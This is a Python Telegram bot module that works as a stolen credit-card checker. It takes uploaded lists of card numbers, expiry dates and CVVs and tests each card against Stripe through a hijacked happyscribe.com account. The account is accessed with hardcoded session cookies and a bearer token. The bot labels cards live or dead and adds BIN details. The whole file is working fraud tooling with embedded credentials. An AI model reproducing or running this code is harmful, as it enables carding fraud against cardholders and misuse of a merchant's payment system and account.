import re
import requests
import time
import aiohttp
from pyrogram import Client, filters
from EQUROBOT import app
import user_agent
import random
import string

# Function to extract credit card details from the message text
def extract_credit_card_details(message_text):
    cards = []
    input = re.findall(r"[0-9]+", message_text)
    
    if not input or len(input) < 3:
        return cards
    
    if len(input) == 3:
        cc = input[0]
        if len(input[1]) == 3:
            mes = input[2][:2]
            ano = input[2][2:]
            cvv = input[1]
        else:
            mes = input[1][:2]
            ano = input[1][2:]
            cvv = input[2]
    else:
        cc = input[0]
        if len(input[1]) == 3:
            mes = input[2]
            ano = input[3]
            cvv = input[1]
        else:
            mes = input[1]
            ano = input[2]
            cvv = input[3]

    if len(mes) != 2 or not (1 <= int(mes) <= 12):
        return cards

    if len(cvv) not in [3, 4]:
        return cards

    cards.append([cc, mes, ano, cvv])
    return cards

# Function to fetch BIN information
async def bin_lookup(bin_number):
    astroboyapi = f"https://astroboyapi.com/api/bin.php?bin={bin_number}"

    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)) as session:
        async with session.get(astroboyapi) as response:
            if response.status == 200:
                try:
                    bin_info = await response.json()
                    brand = bin_info.get("brand", "N/A")
                    card_type = bin_info.get("type", "N/A")
                    level = bin_info.get("level", "N/A")
                    bank = bin_info.get("bank", "N/A")
                    country = bin_info.get("country_name", "N/A")
                    country_flag = bin_info.get("country_flag", "")
                    
                    bin_info_text = f"""
𝗜𝗻𝗳𝗼: {brand} - {card_type} - {level}
𝐈𝐬𝐬𝐮𝐞𝐫: {bank}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {country} {country_flag}
"""
                    return bin_info_text
                except Exception as e:
                    return f"Error: Unable to retrieve BIN information ({str(e)})"
            else:
                return f"Error: Unable to retrieve BIN information (Status code: {response.status})"

# Function to create a Stripe payment method
def create_stripe_payment_method(ccn, mm, yy, cvv, session):
    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    }

    data = f'type=card&billing_details[name]=User&card[number]={ccn}&card[cvc]={cvv}&card[exp_month]={mm}&card[exp_year]={yy}&guid=guid&muid=muid&sid=sid&payment_user_agent=stripe.js%2F2649440aa6%3B+stripe-js-v3%2F2649440aa6%3B+split-card-element&referrer=https%3A%2F%2Fwww.happyscribe.com&time_on_page=26722&key=pk_live_cWpWkzb5pn3JT96pARlEkb7S'

    response = session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
    return response.json().get('id')

# Function to confirm the payment
def confirm_payment(payment_method_id, session):
    cookies = {
        'ahoy_visitor': 'aa9059eb-6025-4c9c-8c93-06b2e7f66bf1',
        'ahoy_visit': '80f8e7d9-33d9-4a44-a389-d3886d799439',
        'cc_cookie': '%7B%22categories%22%3A%5B%22necessary%22%2C%22analytics%22%2C%22marketing%22%5D%2C%22revision%22%3A0%2C%22data%22%3Anull%2C%22consentTimestamp%22%3A%222024-05-28T12%3A11%3A20.214Z%22%2C%22consentId%22%3A%2208a387aa-0eaa-4cea-a8f8-01818d60d128%22%2C%22services%22%3A%7B%22necessary%22%3A%5B%5D%2C%22analytics%22%3A%5B%5D%2C%22marketing%22%3A%5B%5D%7D%2C%22lastConsentTimestamp%22%3A%222024-05-28T12%3A11%3A20.214Z%22%7D',
        '_gcl_au': '1.1.191496317.1716898280',
        '_gid': 'GA1.2.1548126584.1716898280',
        'remember_user_token': 'eyJfcmFpbHMiOnsibWVzc2FnZSI6Ilcxc3hNVEk1TmpZME5WMHNJbVp4V2pSQkxYZExTQzF1ZUVWbWMwVkZSek16SWl3aU1UY3hOamc1T0RJNE9DNDFNemsyTnpZMElsMD0iLCJleHAiOiIyMDI0LTA2LTA0VDEyOjExOjI4LjUzOVoiLCJwdXIiOiJjb29raWUucmVtZW1iZXJfdXNlcl90b2tlbiJ9fQ%3D%3D--ff6189bcbd83ee1b8b9bdc57e2f2bab7bd7894e3',
        'unsecure_is_signed_in': '1',
        '_cioid': '11296645',
        'intercom-device-id-frdatdus': '65896fd8-9074-419f-82af-44775a9800f5',
        '__stripe_mid': 'ae1e7330-bb67-4eb3-a23f-b13874ff22fea69fa5',
        '__stripe_sid': 'e37d1483-f33b-4e9a-a2c9-a5611a239c53b05f6d',
        '_gat_UA-97995424-1': '1',
        '_ga': 'GA1.1.1213546217.1716898279',
        '_ga_4T8KCV9Y2D': 'GS1.1.1716911386.2.1.1716911702.60.0.0',
        'intercom-session-frdatdus': 'WEFUY3IwWXgzU2g2RDg3T0plL0dwL2lUQW55TGlIeitYU0VSWW85dHRqMHl6aG5jZlNHQ3VlQ1hlL01xWm5lYS0tWmpqNDRtOS93RHFwN1pieUJmdnhWdz09--cf67edea8649a57c5be65bbe686daa16825a208d',
        '_transcribe_session': 'GuXUkcJAbE1KxPl5eMKgotmHEhGgkSuczUsAONBjDAtmpodcvjwEVxhaC8tlEQk1ubDXBuAC9nFS5S3tihGZ1BKDQuRICcBbidB9cGQYegOpe6aRqzXjPKW3aUd%2FjvBJwkg5hjBKUMMARHtUhAVtMtsXtagcjdVOCFuvFCdu06RnYFBl%2FNI6ULW%2BxWE2sfsW%2F%2BEUj4wyfUMqjKSVr2xlQus1GnX7fGjveaJlHsPFJAWrnpxgzwy%2FM8Ys8j2wNgSvKAof9zsXN2HH3TK2S%2Fym808vOgJJGC3MdtIAp0kAc%2BA2sIAzvpVtnNrr0pZLCP85T1VZ5tPe387m%2FDC27xu1HvKZc2U%2F4YEMgy2N%2F7'
    }

    headers = {
        'authority': 'www.happyscribe.com',
        'accept': 'application/json',
        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'authorization': 'Bearer OQRJtXO8dyPUQ3DMs8deCgtt',
        'content-type': 'application/json',
    }

    json_data = {
        'id': 11132807,
        'address': 'Eee',
        'name': 'User',
        'country': 'US',
        'vat': None,
        'billing_account_id': 11132807,
        'last4': '6650',
        'orderReference': 'zmemwaft',
        'user_id': 11947346,
        'organization_id': 11453735,
        'hours': 0,
        'balance_increase_in_cents': None,
        'payment_method_id': payment_method_id,
        'transcription_id': None,
        'plan': 'basic_2023_05_01',
        'order_id': None,
        'recurrence_interval': 'month',
        'extra_plan_hours': None,
    }

    response = session.post('https://www.happyscribe.com/api/iv1/confirm_payment', cookies=cookies, headers=headers, json=json_data)
    time.sleep(3)
    return response.json().get('error', '')

@app.on_message(filters.document & filters.private)
async def process_document(client, message):
    if not message.document.file_name.endswith('.txt'):
        await message.reply_text('Please upload a .txt file containing card details.')
        return

    file_path = await message.download()
    with open(file_path, 'r') as file:
        lines = file.readlines()

    total_cards = len(lines)
    processed_cards = 0
    live_count = 0
    dead_count = 0

    session = requests.Session()
    session.headers.update({'User-Agent': user_agent.generate_user_agent()})

    for line in lines:
        line = line.strip()
        cards = extract_credit_card_details(line)
        if cards:
            ccn, mm, yy, cvv = cards[0]
            payment_method_id = create_stripe_payment_method(ccn, mm, yy, cvv, session)
            if not payment_method_id:
                continue

            error_message = confirm_payment(payment_method_id, session)
            bin_info = await bin_lookup(ccn[:6])
            P = f"{ccn}|{mm}|{yy}|{cvv}"

            if "card has insufficient funds" in error_message:
                msg = f'''
┏━━━━━━━⍟
┃STRIPE AUTH 𝟓$ ✅
┗━━━━━━━━━━━⊛
➩ 𝗖𝗮𝗿𝗱 :`{P}`
➩ 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 : {msg}
➩ 𝗠𝗲𝘀𝘀𝗮𝗴𝗲 : CVV CHARGE ✅

{bin_info}
⌛ 𝗧𝗶𝗺𝗲: {time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime())}
                '''
                live_count += 1
            elif "security code or expiration date is incorrect" in error_message or "Your card's security code is incorrect." in error_message:
                msg = f'''
┏━━━━━━━⍟
┃STRIPE AUTH 𝟓$ ✅
┗━━━━━━━━━━━⊛
➩ 𝗖𝗮𝗿𝗱 :`{P}`
➩ 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 : {msg}
➩ 𝗠𝗲𝘀𝘀𝗮𝗴𝗲 : CARD ISSUE CVV DECLINE❎

{bin_info}
⌛ 𝗧𝗶𝗺𝗲: {time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime())}
                '''
                dead_count += 1
            else:
                msg = f'''
┏━━━━━━━⍟
┃DECLINED ❌
┗━━━━━━━━━━━⊛      
➩ 𝗖𝗮𝗿𝗱 ➜ `{P}`
➩ 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➜ {msg}
➩ 𝗠𝗲𝘀𝘀𝗮𝗴𝗲 : DEAD ❌

{bin_info}
⌛ 𝗧𝗶𝗺𝗲: {time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime())}
                '''
                dead_count += 1

            await message.reply_text(msg)

        processed_cards += 1
        await message.reply_text(f'Processed {processed_cards}/{total_cards} cards.')

    summary_msg = f'Total cards: {total_cards}\nProcessed cards: {processed_cards}\nLive cards: {live_count}\nDead cards: {dead_count}'
    await message.reply_text(summary_msg)
    
